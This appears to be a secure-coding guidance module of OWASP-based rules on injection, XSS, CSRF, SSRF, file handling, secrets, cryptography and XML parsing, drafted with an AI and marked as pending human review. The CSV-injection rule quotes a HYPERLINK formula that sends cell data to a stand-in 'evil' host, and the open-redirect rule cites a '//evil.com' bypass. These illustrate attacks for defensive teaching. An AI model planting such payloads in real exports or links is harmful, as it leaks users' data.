---
module: security
capability: Application security (OWASP Top 10) across languages
technologies:
applies: security, vulnerability, injection, xss, csrf, ssrf, secrets, owasp
checked_against: OWASP Top 10 (2021), OWASP ASVS 4.0.3, OWASP Cheat Sheet Series
authorship: Drafted for SkillForge with Claude (Opus 5.5), 2026-11-03; each rule cites the reference it was checked against
review: pending human review
---

## injection-prevention: Keep data separate from code in every interpreter
tags: security, injection, sql injection, command injection, ldap injection, parameterization, owasp
keywords: user input concatenated into query or command
refs: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

Injection happens whenever untrusted input is concatenated into something interpreted: SQL, shell commands, LDAP filters, XPath, templates, regexes. Use APIs that take data separately (parameterized queries, argument arrays without a shell), allowlist anything that must be structural (column names, sort order), and validate input types and lengths.

## xss-output-encoding: Encode output for its context and use a Content Security Policy
tags: security, xss, cross site scripting, output encoding, csp, innerhtml, sanitization
keywords: user content rendered as html
refs: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

Let the template engine escape by default; avoid raw-HTML sinks (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `|safe`). When you must render user HTML, sanitize it with a maintained library (DOMPurify). Validate URL schemes before putting values in `href`/`src`. Add a strict CSP (nonces, no `unsafe-inline`) as defense in depth.

## csrf-protection: Protect cookie-authenticated state changes against CSRF
tags: security, csrf, cross site request forgery, samesite, tokens, cookies, forms
keywords: form submitted from another site
refs: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

When cookies authenticate requests, a malicious site can trigger state-changing requests. Use the framework's CSRF tokens (synchronizer or double-submit), set `SameSite=Lax` or `Strict`, never change state on GET, and verify `Origin`/`Sec-Fetch-Site` headers for APIs.

## ssrf-prevention: Validate and restrict server-side requests to user-supplied URLs
tags: security, ssrf, server side request forgery, url fetch, metadata service, allowlist, webhooks
keywords: fetch user provided url, 169.254.169.254
refs: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

Fetching a URL a user provides (webhooks, link previews, imports) can reach internal services and cloud metadata endpoints. Allowlist hosts or schemes where possible; otherwise resolve the hostname, reject private, loopback, link-local and metadata addresses, connect to the vetted IP (to prevent DNS rebinding), disable redirects or re-check each hop, and enforce timeouts and size limits. Use IMDSv2 on AWS.

## path-traversal: Resolve and confine file paths built from user input
tags: security, path traversal, directory traversal, file upload, zip slip, file access
keywords: ../ in filename, read arbitrary file
refs: https://owasp.org/www-community/attacks/Path_Traversal

Never join user input onto a base directory without checks: `../`, absolute paths and symlinks escape it. Prefer opaque IDs mapped to stored paths; otherwise canonicalize (`realpath`/`Path.resolve()`) and verify the result is inside the base directory. Apply the same check to archive entries when extracting (zip slip).

## file-upload-safety: Validate uploads by content, store them outside the web root, and limit size
tags: security, file upload, content type, malware, storage, size limit, svg
keywords: uploaded php file executed
refs: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

Enforce size limits, allowlist extensions and check content (magic bytes), generate server-side filenames, store uploads outside the web root or in object storage served with `Content-Disposition: attachment` and a safe content type, and treat SVG and HTML uploads as active content.

## secrets-management: Keep secrets out of code, logs and client bundles
tags: security, secrets, api keys, credentials, environment variables, secret scanning, rotation
keywords: key committed to git
refs: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

Load secrets at runtime from a secret manager or the environment, never from source code or committed config; scan commits for secrets; redact them from logs and error reports; and rotate any secret that was exposed (removing it from history is not enough). Front-end bundles are public: they can hold only publishable keys.

## dependency-vulnerabilities: Track and update vulnerable dependencies
tags: security, dependencies, vulnerabilities, sca, cve, supply chain, lock files, sbom
keywords: outdated library with known cve
refs: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/

Commit lock files, run software composition analysis in CI (npm audit, pip-audit, OWASP Dependency-Check, Dependabot/Renovate), prioritize vulnerabilities reachable from your code, and keep dependencies current in small, frequent updates rather than rare large jumps.

## secure-defaults-config: Ship secure defaults and fail closed
tags: security, misconfiguration, debug mode, default credentials, cors, security headers, fail closed
keywords: debug enabled in production, permissive cors
refs: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

Disable debug modes and verbose errors in production, remove default accounts, set security headers (HSTS, CSP, `X-Content-Type-Options: nosniff`, frame-ancestors), restrict CORS to known origins, and make authorization checks deny when a policy is missing or errors.

## cryptography-use: Use vetted cryptographic libraries and modern algorithms
tags: security, cryptography, encryption, aes gcm, random, csprng, hashing, tls
keywords: Math.random token, ECB mode, custom crypto
refs: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

Never invent cryptography. Use high-level libraries (libsodium, Tink, the platform's AEAD APIs) with authenticated encryption (AES-GCM, ChaCha20-Poly1305), never ECB or unauthenticated CBC; generate tokens and keys with a CSPRNG (`secrets`, `crypto.randomBytes`, `SecureRandom`), not `Math.random`; keep keys in a KMS; and compare secrets in constant time.

## security-logging: Log security events without logging secrets
tags: security, logging, audit log, monitoring, authentication events, incident response
keywords: no record of who did what, audit trail, siem, login attempts, log injection, log forging, newline in username
refs: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

Record authentication successes and failures, authorization denials, privilege changes and administrative actions with who, what, when and from where, in tamper-resistant storage. Exclude passwords, tokens, session IDs and unnecessary personal data, and neutralize newlines in logged user input to prevent log injection.

## deserialization-safety: Never deserialize untrusted data into arbitrary objects
tags: security, insecure deserialization, pickle, java serialization, yaml, object injection, rce
keywords: ObjectInputStream, unserialize user input
refs: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html

Native object deserializers (Java serialization, Python pickle, PHP `unserialize`, .NET `BinaryFormatter`, unsafe YAML loaders) can execute code from crafted input. Accept only data formats (JSON) parsed into explicit types, sign data you must round-trip, and keep gadget-prone libraries patched.

## threat-modeling: Threat-model features that cross trust boundaries
tags: security, threat modeling, stride, trust boundaries, design review, attack surface
keywords: security review before launch
refs: https://owasp.org/www-community/Threat_Modeling

For features that handle authentication, payments, file processing, external URLs or multi-tenant data, sketch the data flow, mark trust boundaries, and ask what can be spoofed, tampered with, repudiated, disclosed, denied or escalated (STRIDE). Turn each credible threat into a control and a test.

## open-redirect: Validate redirect targets against an allowlist
tags: security, open redirect, redirect url, phishing, return url, oauth
keywords: ?next= redirects anywhere
refs: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

Redirecting to a URL from a parameter (`?next=`, `?returnUrl=`) lets attackers bounce users to phishing sites with your domain in the link. Accept only relative paths (rejecting `//evil.com` and backslash variants) or IDs mapped to allowlisted destinations.

## csv-formula-injection: Neutralize spreadsheet formulas in exported CSV cells
tags: security, csv, excel, spreadsheet, formula injection, export, google sheets
keywords: export to csv, open in excel, download report
refs: https://owasp.org/www-community/attacks/CSV_Injection

Spreadsheet programs evaluate a cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, so a user-controlled value such as `=HYPERLINK("http://evil/?"&A1,"Click")` runs when finance opens the export. Prefix such text cells with a single quote (`'`), and write rows with a CSV library (`csv.writer`, not string joins) so commas, quotes and newlines are quoted. Apply it to every field a user can influence, not only names.

## client-ip-behind-proxies: Derive the client IP from trusted proxy headers only
tags: security, x forwarded for, client ip, proxy, load balancer, rate limiting, spoofing
keywords: rate limit bypassed with a header, req.ip is the load balancer
refs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For#security_and_privacy_concerns

`X-Forwarded-For` is a client-writable list: anything left of what your own proxies appended is attacker-controlled. Configure the number of trusted proxy hops (or their addresses) and take the address that hop count from the right; never use the leftmost value for rate limiting, audit logs or allowlists.

## xml-external-entities: Disable external entities and DTDs when parsing XML
tags: security, xxe, xml, external entities, dtd, parser configuration, ssrf
keywords: parsing uploaded xml, SAML, SVG uploads
refs: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

XML parsers that resolve external entities can read local files or make server-side requests from a crafted document (XXE), and entity expansion can exhaust memory. Disable DTDs and external entities in the parser configuration, or use hardened parsers (Python `defusedxml`), for every XML input, including SVG, SAML and office documents.

## decompression-limits: Bound decompressed size and file counts for uploads and archives
tags: security, zip bomb, decompression bomb, gzip, archive, denial of service, limits
keywords: small upload filled the disk
refs: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

A few kilobytes of compressed data can expand to gigabytes. When decompressing uploads (zip, gzip request bodies, images), stream with a running byte counter and abort above a limit, cap the number of archive entries and nesting depth, and check declared sizes without trusting them.
